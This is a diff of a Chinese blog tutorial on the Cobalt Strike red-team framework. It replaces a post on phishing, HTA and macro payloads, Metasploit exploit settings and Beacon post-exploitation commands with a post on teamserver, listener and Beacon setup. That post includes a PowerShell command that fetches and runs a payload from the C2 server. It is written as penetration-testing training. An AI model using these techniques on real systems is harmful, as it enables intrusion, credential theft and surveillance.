@@ -1,356 +1,410 @@
-# Cobalt Strike基础教程（二）
+# Cobalt Strike基础教程（一）
 
 
-Cobalt Strike基础教程（二）--v4ler1an
+Cobalt Strike基础教程（一）--v4ler1an
 
 <!--more-->
 
-## 一、目标攻击
+## 一、基础操作
 
-### 客户端程序攻击
+### 简介
 
-一种依靠应用程序使用控制端来进行的可视化攻击。
+Cobalt Strike是一款渗透测试神器，简称CS，早期依赖Metasploit框架，现在已作为单独的平台使用。
 
-随着时代发展到了今天，在有各种WAF、防火墙的情况下，各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。
+Cobalt Strike集成了端口转发、扫描、监听Listener、Windows exe程序payload生成、Windows DLL动态链接库payload生成、java程序payload生成、office宏代码payload生成，还包括站点克隆、获取浏览器的相关信息等功能。
 
-而当我们发送一个钓鱼文件到客户端上，再由客户端打开这个文件，最后客户端穿过防火墙回连到我们，此时在客户端上我们就获得了一个立足点`foothold`。这样的一个过程是相对而言是较为容易的，这也是为什么要进行客户端攻击。
+![image-20240222143954956](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png)
 
-### 系统侦察
+### 组织结构
 
-`System Profiler`是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。
+Cobalt Strike采用的是C/S架构，server端连接到目标服务器，client再连接server。所以，client不会直接与目标服务器进行交互。设计的主要目的是为了分布式团队协作。
 
-设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择`System Profiler`功能模块，配置待跳转的URL等信息即可。
-
-![image-20240228100435941](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281004623.png)
-
-如果勾选了`Use Java Applet to get information`则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。
-
-配置完成后，目标打开配置后的链接后，可以在三个地方进行观察：
+文件目录结构如下：
 
 ```shell
-View --> Applications
-View --> Web Log
-Cobalt Strike --> Visualization --> Target Table
+┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1]
+└─$ tree -L 2 .
+.
+├── Client
+│   ├── cobaltstrike.auth
+│   ├── cobaltstrike-client.cmd		-- Windows client启动文件
+│   ├── cobaltstrike-client.jar		-- client启动jar文件
+│   ├── cobaltstrike-client.sh		-- Linux/MacOS client启动文件
+│   └── uHook.jar							
+└── Server
+    ├── c2lint				-- 检查profile的错误和异常
+    ├── cobaltstrike.auth
+    ├── cobaltstrike.store              -- server和client加密通信的证书
+    ├── data
+    ├── downloads                       -- 文件下载目录
+    ├── logs                            -- 日志目录
+    ├── screenshots                     -- 截图目录
+    ├── source-common.sh
+    ├── teamserver			-- server启动脚本
+    ├── TeamServerImage			-- 实际的启动elf文件
+    └── third-party		        -- 第三方工具
 ```
 
-目标打开链接后，在CS上就可以看到目标使用的浏览器版本、系统版本等信息，然后就可以搜索相关的漏洞。
 
-![image-20240227203537827](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035855.png)
 
-![image-20240227203525334](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402272035369.png)
+### 连接方式
 
-值得注意的是，如果CS的web服务器收到了lynx、wget或curl的请求，CS会自动返回一个404，防止被蓝队窥探。
+Cobalt Strike的client想要连接server需要知道三个信息：
 
-### Cobalt Strike的攻击方式
+- server的外部ip地址
+- serve的连接密码
+- (optional)决定malleable C2工具的哪一个配置文件用于server
 
-**User-Driven Attacks**
+#### 开启server
 
-用户驱动攻击，即需要欺骗用户进行交互以达到攻击目的的一种攻击方式。
-
-首先用户驱动攻击不包含恶意攻击代码，因此可以绕过系统的安全补丁防御；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后用户驱动攻击的方式比较可靠稳定。
-
-CS内置了几个用户驱动攻击的选项，在最新的4.9版本中，已经没有原来的`Attacks --> Packages`，而是拆分到了`Payloads`和`Attacks`两个选项下。
-
-#### User-Driven Payload
-
-在`Payloads`选项下，包含的payload类型如下：
-
-![image-20240228101216117](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281012180.png)
-
-**1、HTML Application**
-
-HTML应用`HTML Application`生成(executable/VBA/powershell)这3种原理不同的VBScript实现的`evil.hta`文件。（实测win10就已经失效，不起作用了。）
-
-**2、Microsoft Office Macro**
-
-Microsoft Office 宏文件`Microsoft Office Document Macros`可以生成恶意宏放入office文件，非常经典的攻击手法。（实测win版本excel无效，wps不启用宏。）
-
-**3、Stager/Stageless Payload Generator**
-
-Payload生成器`Payload Generator`可以生成各种语言版本的Payload，便于进行免杀。
-
-**4、Windows Stager Payload**
-
-Windows 可执行文件`Windows Executable` 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb)
-
-**5、Windows Stageless Payload**
-
-Windows 可执行文件（Stageless）`Windows Executable (Stageless)`会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb)
-
-#### User-Driven Attacks
-
-在`Attacks`选项下，包含的web类攻击方式有：
-
-![image-20240228101842180](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281018230.png)
-
-**1、Scripted Web Delibery(S)**
-
-脚本化web托管，为payload提供一个web服务便于下载和执行，类似于msf的Script Web Delivery。
-
-![image-20240228102749445](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281027496.png)
-
-Launch之后，会创建一个web服务，然后给出对应的命令，在目标上执行命令即可获得权限。
-
-**2、Signed Applet Attack**
-
-这是一个Java自签名的Applet的攻击，CS会启动一个Web服务以提供自签名的Java Applet的运行环境，浏览器会要求用户授予Applet运行权限。目标同意后，就会获取权限。（这种攻击方法目前已经基本处于过时状态。）
-
-![image-20240228103430946](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281034002.png)
-
-设置好listener之后，在目标侧访问给出的链接：
-
-![image-20240228103540249](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281035301.png)
-
-**3、Smart Applet Attacks**
-
-智能化Applet攻击，会自动检测Java版本并利用已知的漏洞绕过安全沙箱，CS官方称该方法应过时，实战环境无效。
-
-![image-20240228104430445](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281044503.png)
-
-#### 联动MSF
-
-如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。
-
-1、首先在MSF上选择攻击模块
-
-2、接着在MSF上设置Payload为`windows/meterpreter/reverse_http`或者`windows/meterpreter/reverse_https`，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的。
-
-3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口。
-
-4、然后设置 `DisablePayloadHandler` 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了。
-
-5、再设置 `PrependMigrate` 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。
-
-6、最后运行`exploit -j`，-j 是指作为job开始运行，即在后台运行。
-
-**操作**
-
-在CS中新建一个HTTP Beacon，创建过程不再赘述。
-
-1、在MSF中选择攻击模块，根据教程这里选择的`adobe_flash_hacking_team_uaf`模块，不过个人感觉现在这个模块已经不太能被利用成功了。
-
-```
-use exploit/multi/browser/adobe_flash_hacking_team_uaf
-```
-
-2、接着配置payload，这里选择revese_http payload
-
-```
-set payload windows/meterpreter/reverse_http
-set LHOST cs_server_ip
-set LPORT 80
-```
-
-3、之后，配置`DisablePayloadHandler`、`PrependMigrate`为 True
-
-```
-set DisablePayloadHandler True
-set PrependMigrate True
-```
-
-4、最后，开始攻击。
-
-```
-exploit -j 
-```
-
-![image-20220213223714440](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281115902.png)
-
-#### 鱼叉钓鱼
-
-四个步骤：
-
-1. 创建目标清单
-2. 制作邮件模版或者使用现成模版
-3. 选择邮件服务器
-4. 发送邮件
-
-**标清单**
-
-目标清单就是每行一个邮件地址的txt文件，即每行包含一个目标。
-
-在一行中除了邮件地址也可以使用标签或一个名字。如果提供了名称，则有助于 Cobalt Strike 自定义每个网络钓鱼。
-
-这里使用一些在线邮件接收平台的邮箱地址作为示例。
-
-```
-astrqb79501@chacuo.net    test1
-gswtdm26180@chacuo.net    test2
-ypmgin95416@chacuo.net    test3
-```
-
-将以上内容保存为txt文本文件，就创建好了自己的目标清单。
-
-**模板**
-
-使用模板的好处在于可以重复利用，制作钓鱼模板也很简单。可以先在邮箱中找一封广告邮件，查看邮件原始信息，一般在邮件的选项里能找到这个功能，然后导出为`.eml`文件作为模板。
-
-**发送邮件**
-
-有了目标和模板，然后选好自己的邮件服务器，之后就可以发送消息了。
-
-在CS客户端中，点击`Attacks --> Spear Phish`即可打开网络钓鱼模块。添加上目标、模板、钓鱼地址、邮箱服务、退回邮箱，其中Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致，否则会报错。
-
-![img](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281143961.png)
-
-所有信息添加完成后，可以点击Preview查看。如果感觉效果不错，就可以点击send发送了。
-
-当目标收到钓鱼邮件，并且点击钓鱼邮件中的链接后，如果钓鱼链接配置的没有问题，CS就能够上线了。
-
-## 二、后渗透
-
-### Beacon管理
-
-**Beacon 控制台**
-
-在一个 Beacon 会话上右击 `interact`（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。
-
-在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。
-
-![image-20240228115003627](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281150692.png)
-
-Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。
-
-![image-20240228115414456](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154536.png)
-
-![image-20240228115341789](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281153869.png)
-
-**Beacon 菜单**
-
-Access：包含了一些对凭据的操作及提权的选项
-
-![image-20240228115448302](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154374.png)
-
-Explore：包含了信息探测与目标交互的选项
-
-![image-20240228115502710](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155778.png)
-
-Pivoting：包含了一些设置代理隧道的选项
-
-![image-20240228115513340](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155410.png)
-
-Session：包含了对当前 Beacon 会话管理的选项
-
-![image-20240228115522290](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281155360.png)
-
-**Beacon 命令**
-
-- `help`：查看 Beacon 命令的帮助信息。使用 help + 待查看帮助的命令可查看该命令的帮助信息。
-
-- `clear`：清除 Beacon 命令队列。Beacon 是一个异步的 Payload，输入的命令并不会立即执行，而是当 Beacon 连接到团队服务器时再一一执行命令，因此当需要清除队列命令时就可以使用 clear 命令。
-
-- `sleep`：改变 Beacon 的休眠时间。输入 `sleep 30`表示休眠30秒；输入`sleep 60 50`表示，随机睡眠 30秒至60秒，其中30秒 = 60 x 50%；如果输入 `sleep 0`则表示进入交互模式，任何输入的命令都会被立即执行，当输入一些命令，比如`desktop`时， Beacon 会自动进入交互模式。
-
-- `shell`：通过受害主机的 cmd.exe 执行命令。比如运行`ipconfig`，就需要输入`shell ipconfig`
-
-- `run`：不使用 cmd.exe 执行命令。该命令也是 run + 命令的形式运行，该命令会将执行结果回显。
-
-- `execute`：执行命令，但不回显结果。
-
-- `cd`：切换当前工作目录。
-
-- `pwd`：查看当前所在目录。
-
-- `powershell`：通过受害主机的 PowerShell 执行命令。比如想在 PowerShell 下运行 `ipconfig`，就需要输入`powershell ipconfig`
-
-- `powerpick`：不使用 powershell.exe 执行 powershell 命令。这个命令依赖于由 Lee Christensen 开发的非托管 PowerShell 技术。powershell 和 powerpick 命令会使用当前令牌（ token ）。
-
-- `psinject`：将非托管的 PowerShell 注入到一个特定的进程中并从此位置运行命令。
-
-- `powershell-import`：导入 PowerShell 脚本到 Beacon 中。直接运行 powershell-import + 脚本文件路径即可，但是这个脚本导入命令一次仅能保留一个 PowerShell 脚本，再导入一个新脚本的时候，上一个脚本就被覆盖了，因此可以通过导入一个空文件来清空 Beacon 中导入的脚本。
-
-- `powershell get-help`：获取 PowerShell 命令的相关帮助信息。比如想获取 PowerShell 下 get-process 命令的帮助，就需要输入`powershell get-help get-process`
-
-- `execute-assembly`：将一个本地的 .NET 可执行文件作为 Beacon 的后渗透任务来运行。
-
-- `setenv`：设置一个环境变量。
+开启server的常规命令如下（Linux环境）：
 
 ```shell
-    Command                   Description
-    -------                   -----------
-    !                         Run a command from the history
-    argue                     Spoof arguments for matching processes
-    blockdlls                 Block non-Microsoft DLLs in child processes
-    browserpivot              Setup a browser pivot session
-    cancel                    Cancel a download that's in-progress
-    cd                        Change directory
-    checkin                   Call home and post data
-    chromedump                Recover credentials from Google Chrome
-    clear                     Clear beacon queue
-    clipboard                 Attempt to get text clipboard contents
-    connect                   Connect to a Beacon peer over TCP
-    covertvpn                 Deploy Covert VPN client
-    cp                        Copy a file
-    data-store                Store post-ex items to Beacon
-    dcsync                    Extract a password hash from a DC
-    desktop                   View and interact with target's desktop
-    dllinject                 Inject a Reflective DLL into a process
-    dllload                   Load DLL into a process with LoadLibrary()
-    download                  Download a file
-    downloads                 Lists file downloads in progress
-    drives                    List drives on target
-    elevate                   Spawn a session in an elevated context
-    execute                   Execute a program on target (no output)
-    execute-assembly          Execute a local .NET program in-memory on target
-    exit                      Terminate the beacon session
-    file_browser              Open the file browser tab for this beacon
-    getprivs                  Enable system privileges on current token
-    getsystem                 Attempt to get SYSTEM
-    getuid                    Get User ID
-    hashdump                  Dump password hashes
-    help                      Help menu
-    history                   Show the command history
-    inject                    Spawn a session in a specific process
-    inline-execute            Run a Beacon Object File in this session
-    jobkill                   Kill a long-running post-exploitation task
-    jobs                      List long-running post-exploitation tasks
-    jump                      Spawn a session on a remote host
-    kerberos_ccache_use       Apply kerberos ticket from cache to this session
-    kerberos_ticket_purge     Purge kerberos tickets from this session
-    kerberos_ticket_use       Apply kerberos ticket to this session
-    keylogger                 Start a keystroke logger
-    kill                      Kill a process
-    link                      Connect to a Beacon peer over a named pipe
-    logonpasswords            Dump credentials and hashes with mimikatz
-    ls                        List files
-    make_token                Create a token to pass credentials
-    mimikatz                  Runs a mimikatz command
-    mkdir                     Make a directory
-    mode dns                  Use DNS A as data channel (DNS beacon only)
-    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)
-    mode dns6                 Use DNS AAAA as data channel (DNS beacon only)
-    mv                        Move a file
-    net                       Network and host enumeration tool
-    note                      Assign a note to this Beacon
-    portscan                  Scan a network for open services
-    powerpick                 Execute a command via Unmanaged PowerShell
-    powershell                Execute a command via powershell.exe
-    powershell-import         Import a powershell script
-    ppid                      Set parent PID for spawned post-ex jobs
-    printscreen               Take a single screenshot via PrintScr method
-    process_browser           Open the process browser tab for this beacon
-    ps                        Show process list
-    psinject                  Execute PowerShell command in specific process
-    pth                       Pass-the-hash using Mimikatz
-    pwd                       Print current directory
-    reg                       Query the registry
-    remote-exec               Run a command on a remote host
-    rev2self                  Revert to original token
-    rm                        Remove a file or folder
-    rportfwd                  Setup a reverse port forward
-    rportfwd_local            Setup a reverse port forward via Cobalt Strike client
-    run                       Execute a program on target (returns output)
-    runas                     Execute a program as another user
-    runasadmin                Execute a program in an elevated context
-    runu                      Execute a program under another PID
-    screenshot                Take a single screenshot
-    screenwatch               Take periodic screenshots of desktop
-    setenv                    Set an environment variable
-    shell                     Execute a command via cmd.exe
-    shinject                  Inject shellcode into a process
-    shspawn                   Spawn process and inject shellcode into it
-    sleep                     Set beacon sleep time
-    socks                     Start/Stop a SOCKS4a/SOCKS5 server to relay traffic
+./teamserver your_ip your_password [config_file]
+
+
+┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1/Server]
+└─$ sudo ./teamserver 172.16.86.138 v4ler1an
+[sudo] password for v4ler1an:
+
+[*] Will use existing X509 certificate and keystore (for SSL)
+
+[*] Starting teamserver
+[*] Team Server Version: 4.9.1 (Pwn3rs)
+[*] Setting 'https.protocols' system property: SSLv3,SSLv2Hello,TLSv1,TLSv1.1,TLSv1.2,TLSv1.3
+... ...
+[+] Team server is up on 0.0.0.0:50050
+[*] SHA256 hash of SSL cert is: xxxx
+[+] Listener: test started!
+```
+
+#### client连接server
+
+client可以在Windows、Linux、MaxOS下运行，根据个人需求来就行。4.9版本的client的目录下的启动文件如下:
+
+```shell
+┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1/Client]
+└─$ ls
+cobaltstrike.auth  cobaltstrike-client.cmd  cobaltstrike-client.jar  cobaltstrike-client.sh  uHook.jar
+```
+
+直接运行对应的文件即可。
+
+![image-20240222142725955](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png)
+
+点击Connect后，第一次连接会有提示信息，要求确认提示信息中的hash是不是server的hash，确认是就点击Yes，就可以进入client的GUI界面：
+
+![image-20240222142904061](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png)
+
+成功连接后，团队成员直接可以直接在client中进行交流沟通，信息共享等。
+
+#### client连接不同的server
+
+Cobalt Strike的设计初衷是在不同的阶段使用不同的server，因此在一次渗透行动中往往会使用到多个server。这样设计的目的主要是进行任务隔离，确保安全，在一个server出现意外停止运行时，不会影响到整个渗透过程。
+
+连接不同的server，在client的左上角的+号，输入server信息即可连接：
+
+![image-20240222145413463](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png)
+
+![image-20240222145445280](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png)
+
+此时在最下方就会有多个server连接的切换条。
+
+### 分布式协作
+
+这里以最基本的团队模型为例，涉及三个server：
+
+- Staging Servers，临时服务器，主要为了在短时间内对目标系统进行访问，也是最开始用于传递payload、获取初始权限的server，承担了初始的权限提升和下载权限维持程序的功能，暴露风险较大。
+- Long Haul Servers，持久化访问服务器，保持对目标网络的长期访问，以较低频率与目标进行通信。
+- Post-Exploitation Servers，后渗透服务器，进行后渗透及横向移动的相关任务，比如与目标进行交互式访问。
+
+#### 可伸缩红队操作模型
+
+Scaling Red Operations，可伸缩红队操作模型，分为两个层次，第一层次是针对单个目标网络的目标单元；第二层次是针对多个目标网络的权限管理单元。
+
+目标单元的工作：
+
+- 负责具体目标或行动的对象
+- 获得访问权限、后渗透、横向移动
+- 维护本地基础设施
+
+访问管理单元的工作：
+
+- 保持所有目标网络的访问权限
+- 获取访问权限并接收来自单元的访问
+- 根据需要传递对目标单元的访问
+- 为持续回调保持全局基础环境
+
+#### 团队角色
+
+- 初始渗透人员，主要任务是进入目标系统，并扩大立足点
+- 后渗透人员，主要任务是对目标系统进行数据挖掘、对用户进行监控、收集目标系统的密钥、日志等敏感信息
+- 权限管理人员，主要任务是建立基础设施、保持shell的持久化访问、管理回调、传递全局访问管理单元之间的会话
+
+### 日志与报告
+
+#### 日志记录
+
+Cobalt Strike的日志文件在团队服务器下的运行目录中的`logs`文件夹内，其中有些日志文件名例如`beacon_11309.log`，这里的`11309`就是beacon会话的ID。
+
+按键的日志在`keystrokes`文件夹内，截屏的日志在`screenshots`文件夹内，截屏的日志名称一般如`screen_015321_4826.jpg`类似，其中`015321`表示时间（1点53分21秒），`4826`表示ID。
+
+#### 导出报告
+
+Cobalt Strike生成报告的目的在于培训或帮助蓝队，在`Reporting`菜单栏中就可以生成报告，关于生成的报告有以下特点：
+
+- 输出格式为PDF或者Word格式
+- 可以输出自定义报告并且更改图标（Cobalt Strike –> Preferences –>Reporting）
+- 可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正。
+
+#### 报告类型
+
+![image-20240222153927259](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png)
+
+- 活动报告（Activity Report）
+
+  提供红队活动的时间表，记录了每个后渗透活动。
+
+- 主机报告（Hosts Report）
+
+  汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也包含在报告内。
+
+- 入侵指标报告（Indicators of Compromise）
+
+  包括对C2扩展文件的分析、使用的域名和上传文件的md5。
+
+- 会话报告（Sessions Report）
+
+  记录了每个会话的指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。
+
+- 社工报告（Social Engineering Report）
+
+  记录了每一轮网络钓鱼的电子邮件、谁点击了邮件以及从每个点击用户处收集的信息。该报告还显示了CS的System profiler发现的应用程序。
+
+- TTP报告（Tactics，Techniques，and Procedures）
+
+  将自己的CS行动与ATT&CK矩阵进行映射，给出具体的ttp。
+
+## 二、基础设施
+
+### Listener管理
+
+定义：等待受害目标回连自己的一个服务。
+
+作用：主要是为了接受payload回传的各类数据，类似于msf中的handler。例如，payload在目标机器执行后，就会回连到listener然后下载执行真正的shellcode代码。一旦listener建立成功，团队成员只需要知道这个listener的名称即可，不必关心listener背后的基础环境。
+
+一个listener由用户定义的名称、payload类型和几个特定于payload的选项组成。Listener的名字一般由以下结构组成：
+
+```shell
+// 操作系统/攻击载荷/传输器
+Operating System/Payload/Stager
+
+
+example:
+windows/beacon_http/reverse_http
+```
+
+#### Stager
+
+payload是需要执行的具体攻击内容，通常分为两部分：stager和stage。
+
+stager是一个体积较小的程序，用于连接、下载stage，并插入到内存中。
+
+为什么会有stager的概念？这是因为在很多攻击中，对于能加载到内存并在成功漏洞利用后执行的数据大小存在严格的限制，这就导致在攻击成功时，很难嵌入额外的payload，因此出现了stager。
+
+#### 创建Listener
+
+在CS的client中打开Cobalt Strike -> Listeners，之后点击下方的Add，弹出New Listener窗口：
+
+![image-20240222173802492](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png)
+
+CS的listener目前有三种类型：
+
+- Beacon类型：直译是信标的意思，是以一种比较隐蔽的后渗透代理，也是CS默认使用的一种类型。Beacon Listener的名称例子如下：
+
+  ```shell
+  windows/beacon_http/reverse_http
+  ```
+
+- Foreign类型：外部listener，主要作用是给其他的payload提供别名，比如msf中的payload。该类型的listener主要是为了提升CS的兼容性，payload可以使用其他的软件生成，但是可以适配CS的listener：
+
+  ```shell
+  windows/foregin/reverse_https
+  ```
+
+- External C2（新增）：使用其他类型的C2，是新增选项，允许第三方程序使用外部C2服务器与CS的server进行交互。
+
+![image-20240222173926470](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png)
+
+### HTTP和HTTPS Beacon
+
+**Beacon**
+
+- Beacon是CS的Payload
+- Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。
+- 通过HTTP、HTTPS和DNS出口网络
+- 使用SMB协议的时候是点对点通信
+- Beacon有很多的后渗透攻击模块和远程管理工具
+
+**Beacon的类型**
+
+- HTTP 和 HTTPS Beacon HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。
+
+```
+  windows/beacon_http/reverse_http
+  windows/beacon_https/reverse_https
+```
+
+- DNS Beacon
+
+```
+  windows/beacon_dns/reverse_dns_txt
+  windows/beacon_dns/reverse_http
+```
+
+- SMB Beacon SMB Beacon也可以叫做pipe beacon
+
+```
+  windows/beacon_smb/bind_pipe
+```
+
+**创建HTTP Beacon**
+
+点击 Cobalt Strike –> Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save。
+
+![image-20240223110739474](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png)
+
+测试一下刚才设置的监听器，点击Attack –> Web Drive-by –> Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，最后点击Launch:
+
+![image-20240223111429362](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png)
+
+![image-20240223110840913](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png)
+
+复制弹窗中的命令到靶机中执行：
+
+```powershell
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.86.138:80/test'))"
+```
+
+![image-20240223111527176](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png)
+
+回到CS，靶机已经上线：
+
+![image-20240223111606515](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png)
+
+![image-20240223111800363](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png)
+
+**HTTPS Beacon**
+
+HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：https://www.cobaltstrike.com/help-malleable-c2#validssl。
+
+### DNS Beacon
+
+使用DNS请求将Beacon返回。这些DNS请求用于解析由你的CS团队服务器作为权威DNS服务器的域名。DNS响应告诉Beacon休眠或是连接到团队服务器来下载任务，DNS响应也告诉 Beacon 如何从你的团队服务器下载任务。
+
+在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。
+
+DNS Beacon的工作流程具体如下：
+
+首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。
+
+![image-20240223161626900](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png)
+
+原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。
+
+根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。
+
+**域名配置**
+
+既然是配置域名，所以就需要先有个域名，添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。然后服务器配置防火墙将UDP的53端口放通。（这里我没有多余的服务器和域名，借用eastjun师傅的图）
+
+![image-20211202223623912](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png)
+
+配置完可以使用nslookup进行测试
+
+![image-20211202224423180](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png)
+
+CS中创建监听器时填写NS记录的域名：
+
+![image-20211202223356738](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png)
+
+靶机上线后不会像其他Beacon一样在第一次连接时就发送目标相关信息，在没有任务的情况下CS服务器都是简单响应DNS请求而不做任何操作，在执行任何一条命令之后靶机会将目标相关信息提交过来。
+
+![image-20211202225129950](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png)
+
+### SMB Beacon
+
+SMB Beacon使用命名管道通过一个父Beacon进行通信，这种对等通信对同一台主机上的Beacon和跨网络的Beacon都有效。Windows将命名管道通信封装仔SMB协议中，因此得名SMB Beacon。
+
+因为使用SMB协议通信，Windows的系统防火墙默认放通445端口，所以SMB Beacon在绕防火墙时可能会有意外作用。
+
+![img](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png)
+
+**SMB Beacon配置**
+
+首先需要一个上线的主机，上线后新建一个SMB Beacon，输入listener名称，选择Beacon SMB，pipename使用默认值即可：
+
+![image-20240227191613502](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png)
+
+然后在初始beacon中迁移到smb beacon：
+
+![image-20240227191819912](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png)
+
+迁移完成后：
+
+![image-20240227191913542](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png)
+
+可以看到派生的SMB Beacon，在external的ip后有个`∞∞`字符。此时SMB Beacon通过父级的HTTPS Beacon与CS服务器进行通信，而SMB Beacon与HTTPS Beacon通过SMB协议进行通信。
+
+![image-20240227192123585](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png)
+
+随后，我们把SMB Beacon注入到一个进程中：
+
+![image-20240227192323558](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png)
+
+注入完成后，SMB Beacon就转变为对应进程派生的beacon了：
+
+![image-20240227192530624](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png)
